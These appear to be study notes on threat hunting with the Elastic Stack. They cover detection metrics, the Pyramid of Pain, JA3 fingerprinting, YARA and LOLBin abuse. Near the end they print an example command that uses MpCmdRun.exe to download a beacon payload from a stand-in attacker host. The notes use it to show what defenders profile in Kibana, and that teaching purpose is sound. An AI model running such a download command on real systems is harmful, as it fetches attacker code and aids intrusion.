## Threat Hunting
Source: Threat Hunting with Elastic Stack
![](attachments/Pasted%20image%2020220922120826.png)

## Introduction to Threat Hunting
The problem with this early approach to infosec / secops was that it was very reactionary. Threat hunting is a discipline that takes years to masters:
- Understanding DNS
- TLS
- DLL
- Side loading
- How these work together.
- How are these things can be used, misused, or abused.

## Measuring success
- Mean time to detect (MTTD) - how long did it take the organization to detect the adversary?
- Mean time to respond - after detection, how long did it take the organization to respond?
- Rate of recidivism - how long after you evicted an adversary did they try again?

## Six D's
- Detect = how the defenders will detect the adversary.
- Deny = how defenders deny objective success to the adversary. For example deny access to system accounts necessary to move laterally.
- Disrupt = how defenders could disrupt an adversary objective. Including interrupt the flow of their attack.
- Degrade = how defenders could degrade an adversary's ability to fully accomplish their objective.
- Deceive = how defenders could deceive an adversary so that they can assume they have something of value that turns out to be worthless. For example to plant honey tokens throughout network. Creating domain-passwords.txt and if the adversary attempts to use them to escalate access you can detect it.
- Destroy = Not necessarily important, but to complete six D's :)

## Pyramid of Pain
This model is more of a roadmap for accomplishing the D's. This model highlights the difficulties that adversaries have when different elements of their campaign are discovered and shared. We can harass, frustate and stress the adversary by pressuring them.

![](attachments/Pasted%20image%2020220923171258.png)

### Hash values
Hash represent signature of a exploit or malware file which was being used by the adversary. When defenders learn the hash of files used by the adversary, they may use it to search and block the file before they could be used to any effect. 

However, this detection is trivial, that Malware-as-a-Service (MaaS) providers buld the changing of all their implants for every campaign, so that no two campaigns will ever have the same hash catalog.

### IP addresses
Some adversaries uses same infrastructure to launch their attack. However, still, changing the IP addresses used for campaign is easy for an adversary to do, including creation and hosting of infrastructure, or even The Onion Router (Tor).

### Domain names
Changing the domain names is not difficult, but it causes a few delays for the campaign if they are discovered. Domains have to either be stolen or registered, stealing domains takes time to identify targets, carry out a takeover, and then protect the takeover. Registering new domains requires money to change hands (digital currency, stolen funds, or personal) and it can also take hours to days for the domain to propagate across the internet.

If domain is detected during a campaign, loss of control for an implant can severely delay the campaign.

### Network/host artifacts
Generally, identifies things that are directly associated with how their implant functions. For example would be identifying User-Agent that is used for HTTP connections or the JA3/JA 3S-pair for TLS sessions. You can try to identify with TLS fingerprinting (https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967) to detect abnormal TLS sessions.

### Tools
If the tools being used are detected can causes severe impact on the adversary. The adversary must find, or create a new tool that has the same capabilities but carries them out in a different way. 

YARA is a framework that performs pattern matching on files and can be used to create rules that can use identified tool patterns to ferret out other files used by the adversary.

### TTPs
Conduction identification through the behaviour of the adversary. Defenders may start by looking at TLS metadata, DNS, and then HTTP User-Agents. Attackers may start with a port scan, service enumeration, attempt to move over SMB to a file server.

Identifying an adversary TTP is catastrophic, if you know what they are going to do before they do it, and you're always waiting for them, you force themto completely change how they go about an intrusion.

## Profiling Data
Understanding and expecting how things are going in the environments. Example of JA3 client fingerprints, sorted by the host operating system, and the IP address of the TLS session:

![](attachments/Pasted%20image%2020220923175246.png)

Humans brain does abnormality identification using visuals. So you should consider represent data in graphs.

## Detection Types
### Signature-based detections
Traditional security operations, things like IDS/IPS and firewall are signature-based detections. These are table-stakes for security operations. They block a smaller and smaller percentage of threats because they rely on previously identified threats being analyzed and rules/signatures being created.

### Behaviour-based detection
This dtection are either a derivative of "known bad" or leverage known good binaries/trust/process to perform malicious operations. Example of behaviour-based detections:
- Authenticating from different locations at the same time
- Authentications occuring closely chronologically, but over a large geographic distance.
- Network connections originating from a program that doesn't require network (notepad, vim, textEdit).

One of the most powerful tools in behaviour-based detection is YARA. 

**LOLBins** are legitimate programs that are present on many systems. While these programs have authorized uses and purposes, they can be used to perform nefarious functions. The fact that they can be used legitimately makes it very difficult to detect when they are being abused. For example:
- `At.exe` can be used to schedule tasks, but also to maintain persistence
- `pip` can install Python packages, but it can also be used to upload and download files or even spawn interactive shells
- `Powershell.exe` is an automation and scripting framework, but it can also be used to load and build malware directly onto a compromised system.
Example: `-DownloadFile switch MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe`
![](attachments/Pasted%20image%2020220923181237.png)
Using Kibana, we can profile how MpCmdRun.exe is used in our environment to identify when there are deviations.

(page 36)